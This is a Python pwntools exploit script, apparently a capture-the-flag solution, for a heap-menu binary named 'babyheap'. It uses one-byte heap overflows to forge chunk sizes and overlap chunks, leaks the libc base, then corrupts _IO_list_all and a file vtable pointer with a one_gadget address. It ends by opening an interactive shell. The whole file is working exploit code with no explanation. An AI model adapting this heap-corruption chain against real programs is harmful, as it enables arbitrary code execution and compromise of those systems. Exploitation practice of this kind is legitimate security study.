from pwn import *

r = process('./babyheap')
e = ELF('./babyheap')
libc = e.libc

def alloc(size):
    r.sendlineafter('Command: ', '1')
    r.sendlineafter('Size: ', str(size))
def update(idx, content, size=0):
    r.sendlineafter('Command: ', '2')
    r.sendlineafter('Index: ', str(idx))
    if size:
        r.sendlineafter('Size: ', str(size))
    else:
        r.sendlineafter('Size: ', str(len(content)))
    r.sendlineafter('Content: ', content)
def delete(idx):
    r.sendlineafter('Command: ', '3')
    r.sendlineafter('Index: ', str(idx))
def view(idx):
    r.sendlineafter('Command: ', '4')
    r.sendlineafter('Index: ', str(idx))


alloc(0x18)#0
alloc(0x18)#1
alloc(0x18)#2
alloc(0x18)#3
alloc(0x18)#4
alloc(0x18)#5

alloc(0x18)#6
alloc(0x18)#7
alloc(0x18)#8
alloc(0x38)#9

alloc(0x18)#10
alloc(0x18)#11
alloc(0x18)#12
alloc(0x38)#13

update(3, 'A'*0x18+'\x41')
delete(4)
alloc(0x38)
update(4, 'A'*0x18+'\x21')
## create overlap chunks
update(0, 'A'*0x18+'\xa1')
delete(1)


alloc(0x38)#1

# leak libc base
view(3)
r.recvuntil('Chunk[3]: ')
libc_base = u64(r.recv(8))-libc.symbols['__malloc_hook']-0x68
__malloc_hook = libc_base + libc.symbols['__malloc_hook']
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
magic = libc_base + 0x4526a
io_str_jump = libc_base + 0x3c37a0
log.info('libc base: %#x' % libc_base)
log.info('_IO_str_jump: %#x' % io_str_jump)
log.info('_IO_list_all: %#x' % _IO_list_all)

update(9, 'A'*0x38+'\xa1')
delete(5)
delete(0)
delete(10)

alloc(0x18)
update(4, 'A'*0x18+p64(0x21)+p64(__malloc_hook+0x68)+p64(_IO_list_all-0x10))
alloc(0x18)

update(3, '\x00'*0x18+'\x02')

update(9, '\x00'*8+p64(io_str_jump)+p64(magic))
print hex(magic)
#alloc(0x18)

r.clean()
r.interactive()
